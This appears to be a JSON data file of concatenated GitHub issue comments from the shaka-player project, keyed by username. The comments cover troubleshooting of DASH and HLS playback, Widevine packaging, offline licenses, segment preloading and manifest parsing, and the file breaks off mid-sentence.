    "ghost": "Does it play 33s?\nOn Jun 12, 2017 5:49 PM, \"Joey Parrish\" notifications@github.com wrote:\n\nDASH manifests can supply multiple trick-play tracks. We currently only\nuse one.\nWith multiple tracks, we could choose one based on framerate vs\nplaybackRate, max playout rate vs playbackRate, or resolution & bandwidth.\nMore research is needed to learn how trick play tracks differ when there\nare multiple, and to decide what the decision making process will be for\nShaka when we choose between them. We also need to design changes to our\ninternal structures to accommodate this extra information.\n\u2014\nYou are receiving this because you are subscribed to this thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/872, or mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AbLLUr6H1tAfASAorDsNIuYq10dZgADxks5sDbF5gaJpZM4N3uiS\n.\n. Awesome and thanks @theodab :). @joeyparrish \nI've amended the commit resolving the issues, removed the trailing comma and fixed the spelling mistake :)\nIs there a command I should've run to see the jsdoc error? I ran ./build/all.py and ./build/test.py and didn't get that error \ud83e\udd14 \n. Have now added myself to AUTHORS and CONTRIBUTORS. Should be good to merge!. \n",
    "gscragg": "Cool!\nMy current work adds a persistLicense flag to storage.configure.\nThe default being true.. I changed my approach to an extra param for store as I figured it may be desirable to have the storage logic change per manifest. Although I am not sure how common it is to use a single storage instance to store/remove multiple manifests in the same session.\nHere is what the changes currently look like, along with current naming scheme: https://github.com/google/shaka-player/compare/master...indiereign:offline-data-online-license?expand=1\nI am about to look into updating and adding tests but would appreciate feedback on current approach as well.\nThanks.. Yep, got a barrage of emails :).\nIf its ok with you, I will submit a PR with the changes so I can keep all feedback in one place.. OK, are you doing that, or do you want me to submit another PR?. Working on tests now. I appreciate the quick feedback.. Added some tests in.\nI had a go at testing whether the underlying DrmEngine inside Storage#store was getting initialized correctly but I couldn't figure it out.. Thanks @joeyparrish, I appreciate your speedy response.. Fixed. Thanks.. I have added a new 'stores drm info' test (along with the additions to beforeEach) to check the drmInfo.\nIs this what you meant?. Ok, that makes sense. As this creates a describe with a  single it in it, would you like that to be flattened into a standalone it? . Dropped down to the single test inside the describe group.. ",
    "captnced": "I've seen the very same manifest issue with an Ericsson (Envivio) Halo packager. ",
    "bennypowers": "I'd really like to be able to pre load segments or ranges from a single manifest\n```js\nplayer = new shaka.Player(video);\n// preload with optional ranges param \nplayer.load('foo.mpd', [\n  [0, 1234], // time range in ms\n  [2345, 3456],\n  [4567, 5678],\n  6789, // time index of single segment to pre cache\n]);\n// party \ud83c\udf89\nplayer.attach(video)\n```\n. If that rapid channel switching PoC is public I'd love to see a link, since my use case is similar :D. I, too, am looking to build a list of segments: specifically all the segments which start at the times I have in a pre-determined list of times. (relative to the video's duration)\ne.g. for a 5 minute video, I might want to get all the segments which start or surround each minute, on the 0th second.\nAfter poking around the docs and the source code, I'm stumped. I'd be happy to use findSegmentPosition and getSegmentReference to build up a list of segments, but I just don't know where to find those methods, or how to make use of them. \nIs the only option to proxy the parser?. In the app I'm building, the player loads along with a pre-made list of time indexes for the video. I want to be able to pre-cache those time indexes so that seeking to them is smooth and seamless. To do that, I need to fetch the relevant segment from the server before the user seeks to it.\nimagine a choose-your-own adventure type app that works off of time indexes in one big video stream. You'd want to pre-load the segments for the start of each section of the video, so that the user doesn't have to sit there and buffer.. After looking into this, I'm sure it has something to do with a double call to load or unload. I removed the unload call and waited on any previous load promise, and that got things working again.\nCould this be an area where a console warning would help users?\nThanks.. Ok here's a working version: https://github.com/bennypowers/shaka-player/blob/ca7a4e7d72282434e053ecdf9be782afe26b3815/shaka-player.js#L198\nand a broken commit:\nhttps://github.com/bennypowers/shaka-player/blob/21dc2fde830ee41daa964ae6e8035958cfd937f2/shaka-player.js#L227. Could it be because I'm connecting multiple players to the soon at the same time? In my case, I had these part elements as children in a virtual-list. Multiple re renders via Lit-html. Could be a contributing factor. \nI was using probesupport as it seemed the only way to check at runtime if dash is supported. Did I miss something?. Ahhh perhaps I wasn't clear as to what I had in mind. My idea was to load hls on iPhones as video src instead of loading a dash manifest, and, preferring feature detection to UA parsing, I thought that probeSupport was the only reliable way to do that.\n\nPass all available sources to element\nOn init, element determines which are able to play\nElement prefers dash, then hls, then MP4, depending on UA support.\n\nDo you recommend, for example, that I should do some UA parsing in app code before passing the manifest as a property to my element? \n\nApp decides which manifest to load based on UA string parsing\nApp passes manifest either as dashManifest, hlsManifest, or src property\nElement tries it's best, exposing an error event when needed.. That sounds great. thanks for the advice, I think that should do it. I'm going to close because it seems my problem is solved, but please consider adding some more descriptive errors.. \n",
    "NikitaYeryomin": "Hello! Could you tell if you already support TS-based HLS? The issue is closed but your FAQ still suggests to subscribe to it: https://github.com/google/shaka-player/blob/master/docs/tutorials/faq.md. ",
    "kslimani": "Nevermind, I just realized that project use closure compiler. Closing the issue.. Thank you, i will take a deeper look at python helper scripts.. ",
    "jstephenson01": "@joeyparrish , I was seeing the same Manifest.Restrictions_Cannot_Be_Met while playing a dash manifest in the Shaka Demo v2.1.4 in IE11 (Win10). I updated to Shaka v2.1.5, the asset is playing now (\"Invalid argument\" box pops up on player) but i am seeing new errors/warnings in the console(below)... (i also see that this user was seeing same https://groups.google.com/forum/#!topic/shaka-player-users/e_k0Bd5VEvM)\nDOM7011: The code on this page disabled back and forward caching. For more information, see: http://go.microsoft.com/fwlink/?LinkID=291337\ndemo\nHTML1300: Navigation occurred.\ndemo\nHTML1500: Tag cannot be self-closing. Use an explicit closing tag.\ndemo (99,13)\nPatching input event support on IE.\nUsing ms-prefixed EME v20140218\nUsing native MSE as-is.\nUsing Promises polyfill.\nUsing VTTCue polyfill from 3 argument TextTrackCue.\nNo Period ID given for Period with start time 0,  Assigning a default\nThe last segment should not end before the end of the Period. [object Object]\n   \"The last segment should not end before the end of the Period.\"\n   {\n      [functions]: ,\n      proto: { },\n      endByte: 123230,\n      endTime: 1353.875,\n      position: 22,\n      startByte: 118531,\n      startTime: 1320\n   }\nShould only receive a Shaka error\n(text:7) failed fetch and append: code=undefined\nWrong error type!\nPlayer error Error: Invalid argument.\n   \"Player error\"\n   {\n      [functions]: ,\n      proto: { },\n      description: \"Invalid argument.\",\n      message: \"Invalid argument.\",\n      name: \"Error\",\n      number: -2147024809,\n      severity: 2,\n      stack: \"Error: Invalid argument.\n   at Anonymous function (http://10.99.146.203/shaka-playerv2-5/lib/media/text_engine.js:181:7)\n   at wrapper (http://10.99.146.203/shaka-playerv2-5/lib/polyfill/promise.js:344:9)\n   at shaka.polyfill.Promise.flush (http://10.99.146.203/shaka-playerv2-5/lib/polyfill/promise.js:451:7)\"\n   }\nGot a synthetic key status event, so we don't know the real key statuses. If we don't have all the keys, you'll need to set restrictions so we don't select those tracks.\nShould only receive a Shaka error\n(text:7) failed fetch and append: code=undefined\nWrong error type!\nPlayer error Error: Invalid argument.\n   \"Player error\"\n   {\n      [functions]: ,\n      proto: { },\n      description: \"Invalid argument.\",\n      message: \"Invalid argument.\",\n      name: \"Error\",\n      number: -2147024809,\n      severity: 2,\n      stack: \"Error: Invalid argument.\n   at Anonymous function (http://10.99.146.203/shaka-playerv2-5/lib/media/text_engine.js:181:7)\n   at wrapper (http://10.99.146.203/shaka-playerv2-5/lib/polyfill/promise.js:344:9)\n   at shaka.polyfill.Promise.flush (http://10.99.146.203/shaka-playerv2-5/lib/polyfill/promise.js:451:7)\"\n   }\nGot a synthetic key status event, so we don't know the real key statuses. If we don't have all the keys, you'll need to set restrictions so we don't select those tracks.\n. ",
    "EloB": "Did you managed to run any drm on Tizen 2017/2016 and have a stable playback?. ",
    "dhanapal20": "Hi \nThanks for your detailed analysis, now we have modified the availabilityStartTime as relevant to content presentation time and now content playing well   . ",
    "mhassanist": "Hello,\nFor your question, I don't see that log message, However I tried your suggestion but still not working. Here is my packaging command and the log\npackager ^\n  input=input.mp4,stream=audio,segment_template=audio$Number$.ts,playlist_name=audio-playlist.m3u8 ^\n  input=200k.mp4,stream=video,segment_template=200k$Number$.ts,playlist_name=200k-playlist.m3u8 ^\n  input=400k.mp4,stream=video,segment_template=400k$Number$.ts,playlist_name=400k-playlist.m3u8 ^\n  input=700k.mp4,stream=video,segment_template=700k$Number$.ts,playlist_name=700k-playlist.m3u8 ^\n  --enable_widevine_encryption --key_server_url \"https://license.uat.widevine.com/cenc/getcontentkey/widevine_test\" --protection_scheme cenc --content_id \"3031323334353637\" --signer \"widevine_test\" --aes_signing_key \"1ae8ccd0e7985cc0b6203a55855a1034afc252980e970ca90e5202689f947ab9\" --aes_signing_iv \"d58ce954203b7c9a9a9d467f59839249\" --hls_master_playlist_output=master.m3u8\nLog\nindexed_db.js:36 IndexedDB.install\nmathround.js:40 mathRound.install\nmediakeys.js:43 MediaKeys.install\nmediakeys.js:52 Using native EME as-is.\nmediasource.js:35 MediaSource.install\nmediasource.js:49 Using native MSE as-is.\npromise.js:118 Using native Promises.\nvideo_play_promise.js:35 VideoPlayPromise.install\nvttcue.js:36 Using native VTTCue.\nplayer.js:477 Unload latency: 0.002\nhls_parser.js:642 Unsupported HLS KEYFORMAT com.widevine\n(anonymous) @ hls_parser.js:642\n(anonymous) @ hls_parser.js:625\nplayer.js:614 load() failed: shaka.util.Error {severity: 2, category: 4, code: 4026, data: Array(0)}\nmyapp.js:55 Error code 4026 object shaka.util.Error {severity: 2, category: 4, code: 4026, data: Array(0)}\nonError @ myapp.js:55\n2hls_parser.js:642 Unsupported HLS KEYFORMAT com.widevine\n(anonymous) @ hls_parser.js:642\n(anonymous) @ hls_parser.js:625\n. I did not get this part \"I don't think the packager supports it with TS output; but it does support it with MP4 output.\"\nIs there any way I can do encrypted hls play list protected by widevine and play it with Shaka ? Is there any samples ?\n. Thanks @joeyparrish , I got your point. But when I try this I get another error\npackager ^ input=input.mp4,stream=audio,segment_template=audio$Number$.mp4,playlist_name=audio-playlist.m3u8 ^ input=200k.mp4,stream=video,segment_template=200k$Number$.mp4,playlist_name=200k-playlist.m3u8 ^ input=400k.mp4,stream=video,segment_template=400k$Number$.mp4,playlist_name=400k-playlist.m3u8 ^ input=700k.mp4,stream=video,segment_template=700k$Number$.mp4,playlist_name=700k-playlist.m3u8 ^ --enable_widevine_encryption --key_server_url \"https://license.uat.widevine.com/cenc/getcontentkey/widevine_test\" --protection_scheme cenc --content_id \"3031323334353637\" --signer \"widevine_test\" --aes_signing_key \"1ae8ccd0e7985cc0b6203a55855a1034afc252980e970ca90e5202689f947ab9\" --aes_signing_iv \"d58ce954203b7c9a9a9d467f59839249\" --protection_scheme cenc --hls_master_playlist_output=master.m3u8\nThis error\n[0621/105219:ERROR:stream_descriptor.cc(194)] Stream output not specified.\n. If I understood you correctly, what I shall change is only the extension in the command ? Will I keep the .m3u8 and play list scheme ?. @kqyang  I tried you suggestion and I still get the same error message\npackager ^ input=input.mp4,stream=audio,init_segment=audio_init.mp4,segment_template=audio$Number$.mp4,playlist_name=audio-playlist.m3u8 ^ input=200k.mp4,stream=video,segment_template=200k$Number$.mp4,playlist_name=200k-playlist.m3u8 ^ input=400k.mp4,stream=video,segment_template=400k$Number$.mp4,playlist_name=400k-playlist.m3u8 ^ input=700k.mp4,stream=video,segment_template=700k$Number$.mp4,playlist_name=700k-playlist.m3u8 ^ --enable_widevine_encryption --key_server_url \"https://license.uat.widevine.com/cenc/getcontentkey/widevine_test\" --protection_scheme cenc --content_id \"3031323334353637\" --signer \"widevine_test\" --aes_signing_key \"1ae8ccd0e7985cc0b6203a55855a1034afc252980e970ca90e5202689f947ab9\" --aes_signing_iv \"d58ce954203b7c9a9a9d467f59839249\" --protection_scheme cenc --hls_master_playlist_output=master.m3u8\n[0622/124711:ERROR:stream_descriptor.cc(194)] Stream output not specified.. Thank you both. That did the job.. It does. Thanks a lot.. ",
    "prasadkhambete": "@vaage - Yes, it seems to work when accessed through https. This is not convenient though, because it requires additional steps to set up ssl for apache2 (apt-get install ssl-cert; a2enmod ssl; a2ensite default-ssl) - Why does it work through https but not http ?. @joeyparrish - yes that makes it clear.Thanks! We will transition to use https for our internal test servers. The Chrome browser option to disable secure origin requirement for testing is useful, and will help in the mean time with test servers from external third parties (serving test content on the web) until they get transitioned to use https instead of http. Thanks, Joey. The version-specific subdomains work fine for me.. ",
    "bitactive": "Are there any plans to include this functionality into release in the near future ?. @hyurtseven81 thank you for sharing. \nI have checked this code and seems working.\nI would just change one thing:\nplayer.shaka.setMaxHardwareResolution(variants[maxIndex - 1].width, variants[maxIndex - 1].height);\nplayer.setBitrateLevel(maxIndex);\nplayer.setBitrateLevel(-1);\ninto:\nplayer.shaka.configure({ abr: {restrictions: { maxHeight: variants[maxIndex - 1].height } }});\nThis way player do buffer clean automatically and also do not drop other variants from its list, but only do not take them into consideration during abr selection (so user still can force to select higher resolution).\nI'll check this, test in some A/B scenarios and share some results.. ",
    "porcelijn": "Added input WebVTT input corresponding to mp4 test file sintel-teststream-vtt-input.zip\n. Hi!\nTo help the triage get going, I've set up another presentation with isoff-live profile: https://demo.unified-streaming.com/shaka/wvtt.ism/.mpd\nHere's a link to a live Shaka player. Make sure you enable CC (track language should be multiple, mul).\nCues should start immediately (first cue, cue2, cue3) al the way to cue9 then they disappear for 10 seconds. The we have cue 20...cue 28 and silence once again.\nTo see what should actually be displayed, compare to: dash reference client (again, select text language mul) -- which should show a more or less contiguous uninterrupted series of cue X, where X is increases every second.\nHope this helps!. Great! Thanks\nOn 4 Aug 2017 22:20, \"Joey Parrish\" notifications@github.com wrote:\n\nI've been through this with your demo, and I can see that it is definitely\ncaused by a lack of duration in the trun box. I checked the spec, and it\nseems like we should be using the default from the tfhd box in this case.\nLet me see what I can do.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/919#issuecomment-320344302,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/ABx-7wp5GgnbTxa_kCYxtbT04hCEoHWYks5sU30hgaJpZM4ORGw_\n.\n. \n",
    "ssaguiar": "Just got it:\nin place of:\n python build/all.py\nI did:\nsudo python build/all.py\n. Thank you very much. It's ok to close the issue.\nI apologise for my mistake.. ",
    "vhuerta": "+1. ",
    "msol": "@joeyparrish Hi Joey, can u help us? Please . ",
    "migvz": "+1. ",
    "worg": "Thanks @joeyparrish we'll be posting our feedback there!. I think a callback would be a great way to have a fine grained control over retries and also it would allow us to have stats on which network requests are failing and why.\nThe fact that this new implementation would fallback to the current default behavior should be transparent for those not needing more control over network retries.\nThanks. ",
    "srstrong": "I'll add a +1 to this thread - we have essentially the exact same problem, in that we receive external streams that we need to transcode and package as dash streams.  They frequently have multiple audio tracks with the same language, and we have no additional metadata to determine semantic meaning such as 'main', 'dub' etc.  Right now, we are using the exact same numbered roles as a way to ensure  uniqueness.. Thanks for the quick responses chaps, much appreciated.  I haven't been through the sidx / ssix boxes in alongside the mp4 moof definition in massive detail, but first glance suggested that there would be sufficient info in those boxes to allow the client-side javascript to construct an appropriate moof containing just the frames referenced by the selected level.  So essentially just moving the re-muxing from the server to the client - which will be a very minor hit on the client performance in exchange for improved scalability at the server. That's possibly something we'd be interested in helping with.  I'm working on our server implementation at the moment, so will review the sidx and ssix boxes to see if there is indeed enough information to construct a sane moof.  If so, I'll let you know and we can discuss how that might happen. Thanks for getting back to me - firstly, #999 does look like it will likely solve my problem.  However, whilst I've got your attention, I'd like to just clarify your comments about my segment size, since it looks like I have misinterpreted the spec.  From section 4.3, the spec says:\n\nHowever Segment duration may differ from Representation to Representation. A DASH presentation can be constructed with relative short segments (for example a few seconds), or longer Segments including a single Segment for the whole Representation\n\nWhich is where I've got the idea that a one-hour segment wouldn't be considered unusual.  Although I haven't yet implemented it on the server-side, I am intending to provide a segment index (sidx box) to identify the sub-segments, and I was expected that Shaka would read that sidx and then perform range requests on the segment to download the access units that it needed - I saw parsing code for sidx in the shaka source, so had made the assumption that it was using them.  However, your comment says that the player will only download full segments, and that partial downloads are not supported.  \nHave I misunderstood the spec or your response (or both!)?  Thanks for your help.\n. Ah, ok - so sidx isn't used in conjunction with subsegments but only for SegmentBase.  Taken another quick skim through the code, and can see that subsegments aren't used - my initial search was on sidx, and when I found that I assumed it was being used for subsegments without checking further.  Thanks for clarifying, I'll have a rethink as to how I'm structuring my manifest!  Out of interest, are there any plans in the future to support subsegments?  I think the sidx approach will be considerably more compact than the segment timeline that appears to be the only alternative. . Ok - I guess this relates a little to the conversation on #1503 - if subsegments aren't supported, then I suspect support for ssix is also likely to be difficult.  I'll try to have a dig through the code at some point - naively, I would think that a segment that included subsegment information then the index could be parsed and the segment just transformed from a single segment to a list of segments, much as you are thinking.  Much of the spec uses Segment and SubSegment interchangeably, suggesting that the authors had this sort of approach in mind.\nI'll start reading the docs and the shaka code a bit more fully and see if it looks plausible. ",
    "NeilHollingum": "Thanks for your help. With the references on what you sent I was able to solve my problems.\nBest Regards\nNeil Hollingum. Thanks for your help \u2013 I have found a solution to my problems.\nBest Regards\nNeil Hollingum. ",
    "cmolinaAlicante": "Hi @joeyparrish ,\nThanks for your response but, unfortunately, it doesn't really help. What I'm really trying to do is a multiperiod manifest with trimmed periods. I thought that a good starting point to achieve my goal was knowing how to trim just one period and that's what I asked, as a first step to get my final solution. Do you know if there is a way to build such kind of manifests?\nThanks again for your time!. If I understood your advice, I change duration to 6s and I don't manipulate segment references.\nWith this MPD\n```\n<?xml version=\"1.0\"?>\n\n\ntest.mpd generated by GPAC\n\n\nhttps://testingserver2/dashmedia/segmentTimeline/pal/2s_representation/test.mpd\n\n\n\n\n\n\n\n\n\n\n\n\n\n```\nPlayers seems to download only related segments, but it throws this errors.\n10:10:29.749 segment_index.js:224 Assertion failed: lastReference cannot begin after the end of the Period\nshaka.media.SegmentIndex.fit @ segment_index.js:224\nshaka.dash.SegmentTemplate.createStream @ segment_template.js:94\nshaka.dash.DashParser.parseRepresentation_ @ dash_parser.js:1074\nshaka.dash.DashParser.parseAdaptationSet_ @ dash_parser.js:977\nshaka.dash.DashParser.parsePeriod_ @ dash_parser.js:711\nshaka.dash.DashParser.parsePeriods_ @ dash_parser.js:624\nshaka.dash.DashParser.processManifest_ @ dash_parser.js:517\nI am doing something wrong?\n. ",
    "lelikg": "False alarm, I found this\ndrm.retryParameters.timeout\n:). Actually I take that back, issue persists even when setting retryParameters.timeout to 60000. Hello, guys. Any help would be appreciated.. @joeyparrish thanks for the quick reply.\nSo according to #938 the manifest should play audio bandwidth is 125000, however it never plays for me.\nIt does play in bitdash and dashif and akamai players.\nI am using v2.1.5 because of an error in PlayReady that 2.1.5 fixes.\nCan you please elaborate how I can implement the workaround?. @joeyparrish I'm using nginx rtmp module https://github.com/arut/nginx-rtmp-module. @joeyparrish thanks for all your help\nI used lua to modify the bandwidth=\"0\" to bandwidth=\"600000\" as a temporary workaround, and it works.. @joeyparrish will test and let you know! Thanks!. ",
    "dineshu07": "Hi @mlondon1 ,  I'm also searching for similar solution. Did you find solution for this? i would like to know your status on this. Please let me know if you found any alternative solution. \nThanks \nDinesh. Hi @mlondon1 ,  I'm also searching for similar solution. Did you find solution for this? i would like to know your status on this. Please let me know if you found any alternative solution. \nThanks \nDinesh. ",
    "ondrejpar": "In the meantime: can we use onStreamLoaded event handler,  perform the calculation described in #356 (which is a temporary hack itself, I know) and set the position from inside the handler? Or is there any race condition to be aware of?\nI understand that this workaround is suboptimal, as it will start playing on the live edge and immediately seek to the desired position, but it's better than nothing.. In the meantime: can we use onStreamLoaded event handler,  perform the calculation described in #356 (which is a temporary hack itself, I know) and set the position from inside the handler? Or is there any race condition to be aware of?\nI understand that this workaround is suboptimal, as it will start playing on the live edge and immediately seek to the desired position, but it's better than nothing.. Turns out that the dates reported in stream are bogus (randomly shifted by few seconds), so we decided to go with another approach.We use shakaPlayer.manifest_.presentationTimeline.getEarliestStart() to determine the lowest accessible timestamp and go from there. (We don't have getPlayheadTimeAsDate on Shaka 2.0)\nI can confirm that this information is available when loaddata is called. We don't use loadmetadata.. Turns out that the dates reported in stream are bogus (randomly shifted by few seconds), so we decided to go with another approach.We use shakaPlayer.manifest_.presentationTimeline.getEarliestStart() to determine the lowest accessible timestamp and go from there. (We don't have getPlayheadTimeAsDate on Shaka 2.0)\nI can confirm that this information is available when loaddata is called. We don't use loadmetadata.. Further info: version 2.0.4 had the following undocummented API to get the start of the timeline:\nshakaPlayer.manifest_.presentationTimeline.getEarliestStart();\nwhich worked in uncompiled version only. Playhead used this method to \"crop\" position when seeking.\nPresentation timeline is now accessible using \"official\" API, but the getEarliestStart method is missing.. (I collaborate on this with the original reporter, so I'll ocassionaly add some info here).\nplayer.seekRange always returns start and end values that differ by 86453 seconds - approximately 1 day, which corresponds (roughly) to the timeshift buffer depth. Also, Shaka demo app shows seekbar which is approximately 1 day long, but everything before the \"real\" start date is not in fact seekable - playback freezes, because the segments aren't found.\nWhat we are trying to achieve is to find out the oldest timestamp usable for seeking.\n(@janouskovec  will probably need to prepare new MPD, as this one has already expired).. Well, in version 2.0.4 this worked much better in our use case: Shaka understood that the earliest media timestamp is 95,700,660 (as you wrote above) and didn't allow to seek before that. Even the seekbar in the demo app did only cover range between that timestamp and now. The seekRange method still returned interval defined by timeshiftBufferDepth (iirc).\nBasically, what we need is to get that \"earliest media timestamp\" using API, because we can't fix the manifest and it can't be computed reliably. It was possible in 2.0.4 using the unofficial API mentioned above (shakaPlayer.manifest_.presentationTimeline.getEarliestStart();).\nIs there any way to obtain this information from Shaka player? Even private methods would help at the moment, although it would be great if this would be in the public API. Any help would be much apprectiated :). I can't, but I'll ask @janouskovec  to send one (or provide a download link).. ",
    "JyotirmoyGoswami": "i tested in desktop on chrome Version 59.0.3071.115 (Official Build) (64-bit) and firefox 54 didn't have opportunity to test on any mobile devices and mac. Any help... I think its not about browser support because i recently tested on \"jwplayer\" and it worked on chrome and firefox both on the same version i mentioned earlier. on the first comment i have added the code i used for playing the video. If possible can please the refer the code to find some clue of error occurring.. ",
    "mchanton": "Here's a 2 minute test clip with segments and mpd:\nhttps://drive.google.com/file/d/0B5FcVrgW0GCXdHJIdmlMZXpldjg/view?usp=sharing\nCreated with this ffmpeg call:\nffmpeg -ss 3600 -loglevel error -i video.mp4 -t 120 -c:v libx264 -preset ultrafast -tune fastdecode -g 100 -crf 28 -vsync passthrough -c:a aac -strict -2 output.mp4. Thanks for checking my video!\nI tested your demo page on Edge and it worked for me as well. Then I used the dom inspector of Edge and realized that that Demo page isn't using the html5 native video controls, it uses own controls inside the dom. This means the video is getting seeked with the javascript api and not the native controls. My error only happens with native controls. Seeking with the javascript api works for me too.\nIs using own custom video controls (seekbar, play button etc.) the way to go?. Thanks a lot for fixing it!. ",
    "mikesalvia": "May relate to #519 . @joeyparrish I will get this to you ASAP!. @joeyparrish I have been debugging this via Remote Debugger in DevTools with @hghazzi and we are seeing no errors in the Console. I have visit some other demo sites for DRM and this looks to be an issue also on demo.castlabs.com when trying to play protected content. In both situations, I never see a pop-up to allow my device to be uniquely ID'd for protected content. On other devices this dialogue is displayed and upon choosing Yes, content plays correctly.\nIf I disable protected content all together... The Shaka demo page successfully loads but all Widevine streams are disabled (greyed out).\nThis maybe not necessarily a Shaka-related issue but perhaps a Widevine/Chrome/Android issue.. @joeyparrish Screenshots of DevTools... Also one thing I was able to figure out was that it is when return access.createMediaKeys(); is executed an exception is thrown...\n\n\n\n. @joeyparrish I can investigate more but it looks like the exception is suppressed by the .catch block.. \nThis is the block I am referring to.. @joeyparrish I am doing some more digging and all I can see as far as an exception is a warning about Robustness... As seen in the screenshot above the exception is being caught and handled so nothing is displayed in console log.. @joeyparrish and @vaage was on vacation. Just returned I will work with @hghazzi on this when back in office. Sorry about delay.. @joeyparrish So I checked and I do have WideVine module installed on my devices... I did some watching of arguments[0].\nAnd this is the value I saw... This also appeared to cycle through a few DRM solutions before completing... I think it hit my breakpoint in catch about 4-5 times before failing out and not being able to create keys...\n\n\n\n\n. That is the captured in the DOMException: Unsupported keySystem which is what arguments[0] gives me in the promise chain.. So the first screenshot the 1st console log is indeed where you said before createMediaKeys() the 2nd is inside of the catch after that had failed.. \nAdded an expanded version of this from Watch panel in DevTools.. @joeyparrish Will that help? We are finishing up a release today should be able to get some assistance from @hghazzi to provide any finer details.. @joeyparrish Thanks much! And will totally do!. @joeyparrish Opened a bug with Chromium some of their questions seemed odd but filled it best I could and included this link.\nHere is the ticket in Chromium bug tracker... https://bugs.chromium.org/p/chromium/issues/detail?id=772120. ",
    "roticv": "Looks like EmeManager is attached in Player.. ",
    "ArturoCanizares": "The customer sent us the following information:  I said before that the live playback is working but in fact it is working only when using Bitmovin demo player (this one can detect, support and play widevine encrypted content) . When trying to play with shaka player, the problem happens. I also downloaded the manifest and it is possible to see double KID in it. \nSo we need to keep doing this troubleshooting to figure out why it is happening.\n. Hello Joey,\nCould you please let me know where I can find the issue template?\nThanks\n\n[Description: Description: Description: Description: Description: Ericsson]http://www.ericsson.com/Arturo G. Canizares - Service Delivery Manager (SDM) II\nBMDA Media Sol BLMS CS GSDM US\n6300 Legacy Drive, Plano, TX 75024, United States\nMobile +1 940 300 0836 - Office +1 408-662-9353\n                            E-Mail: arturo.canizares@ericsson.comarturo.canizares@ericsson.com\n                           Ericsson Support:  +1 (844) 281-3459|\n                           Ericsson customer portal:  https://ericssontelevisionprod.service-now.com/ets/\nThis Communication is Confidential. We only send and receive email on the basis of the terms set out at\nhttp://www.ericsson.com/email_disclaimer/\n\nFrom: Joey Parrish [mailto:notifications@github.com]\nSent: Wednesday, August 23, 2017 2:39 PM\nTo: google/shaka-player shaka-player@noreply.github.com\nCc: Arturo Canizares arturo.canizares@ericsson.com; Mention mention@noreply.github.com\nSubject: Re: [google/shaka-player] Issue Title: Halo Live PROD - Problems with Dash + Widevine (#981)\n@ArturoCanizareshttps://github.com/arturocanizares, please use the issue template to provide the necessary info. In particular, a Shaka Player version (so we can tell if the issue has already been resolved) and a manifest URI (so that we can reproduce the issue) are very important.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHubhttps://github.com/google/shaka-player/issues/981#issuecomment-324440638, or mute the threadhttps://github.com/notifications/unsubscribe-auth/Ad1q6sVeK0o9loQNLNE73MaRzk3YMrK1ks5sbH_AgaJpZM4PAX03.\n. Just in case you can include it with the information I sent you, this is what the customer sent me:\nHello Arturo,\nI asked our developer third party and the answer was \u201csince we started to develop the players using the latest version of Shaka player, it wasn\u2019t possible to make it work fine with widevine for live streaming due to the multiple kID in the manifest file got from halo packager\u201d.\nThanks\n\n[Description: Description: Description: Description: Description: Ericsson]http://www.ericsson.com/Arturo G. Canizares - Service Delivery Manager (SDM) II\nBMDA Media Sol BLMS CS GSDM US\n6300 Legacy Drive, Plano, TX 75024, United States\nMobile +1 940 300 0836 - Office +1 408-662-9353\n                            E-Mail: arturo.canizares@ericsson.comarturo.canizares@ericsson.com\n                           Ericsson Support:  +1 (844) 281-3459|\n                           Ericsson customer portal:  https://ericssontelevisionprod.service-now.com/ets/\nThis Communication is Confidential. We only send and receive email on the basis of the terms set out at\nhttp://www.ericsson.com/email_disclaimer/\n\nFrom: Arturo Canizares\nSent: Wednesday, August 23, 2017 5:52 PM\nTo: google/shaka-player reply@reply.github.com; google/shaka-player shaka-player@noreply.github.com\nCc: Mention mention@noreply.github.com\nSubject: RE: [google/shaka-player] Issue Title: Halo Live PROD - Problems with Dash + Widevine (#981)\nHello Joey,\nCould you please let me know where I can find the issue template?\nThanks\n\n[Description: Description: Description: Description: Description: Ericsson]http://www.ericsson.com/Arturo G. Canizares - Service Delivery Manager (SDM) II\nBMDA Media Sol BLMS CS GSDM US\n6300 Legacy Drive, Plano, TX 75024, United States\nMobile +1 940 300 0836 - Office +1 408-662-9353\n                            E-Mail: arturo.canizares@ericsson.comarturo.canizares@ericsson.com\n                           Ericsson Support:  +1 (844) 281-3459|\n                           Ericsson customer portal:  https://ericssontelevisionprod.service-now.com/ets/\nThis Communication is Confidential. We only send and receive email on the basis of the terms set out at\nhttp://www.ericsson.com/email_disclaimer/\n\nFrom: Joey Parrish [mailto:notifications@github.com]\nSent: Wednesday, August 23, 2017 2:39 PM\nTo: google/shaka-player shaka-player@noreply.github.com<mailto:shaka-player@noreply.github.com>\nCc: Arturo Canizares arturo.canizares@ericsson.com<mailto:arturo.canizares@ericsson.com>; Mention mention@noreply.github.com<mailto:mention@noreply.github.com>\nSubject: Re: [google/shaka-player] Issue Title: Halo Live PROD - Problems with Dash + Widevine (#981)\n@ArturoCanizareshttps://github.com/arturocanizares, please use the issue template to provide the necessary info. In particular, a Shaka Player version (so we can tell if the issue has already been resolved) and a manifest URI (so that we can reproduce the issue) are very important.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHubhttps://github.com/google/shaka-player/issues/981#issuecomment-324440638, or mute the threadhttps://github.com/notifications/unsubscribe-auth/Ad1q6sVeK0o9loQNLNE73MaRzk3YMrK1ks5sbH_AgaJpZM4PAX03.\n. I am adding additional information to case # 981:\nSUMMARY:  Sky opened a case with us (WideVine - Google) and provided the following information in quotes below: \n\"After upgrading from Chrome to version 58 by Google we had to update the Shaka Player version to keep our service running. We note that Shaka Player is displaying error 4009, stating that the player does not support multiple key IDs. See the message: \"Having multiple key IDs per Representation is not supported\". Please read the email below and check the Shaka Player's manual (https://shaka-player-demo.appspot.com/docs/api/shaka.util.Error.html#value:4009 ). Checking the manifest generated by Halo Live we noticed that the parameter \"default_KID\" is showing two values. \n \nThe manifest generated directly by Halo Live can be accessed at the link: http://originlive.skyott.com.br/dash/dash_live_01/manifest.mpd If you need the HTTPS link to validate the issue, please see the table below: \nDASH - Canais Lineares - Novas URLs HTTPS \nDescri\u00e7\u00e3o Tipo ABR DRM URL\n1 Canal Linear 01 - DASH WV Live DASH Widevine https://skylivedash-a.akamaihd.net/dash_live_01/manifest.mpd \n2 Canal Linear 03 - DASH WV Live DASH 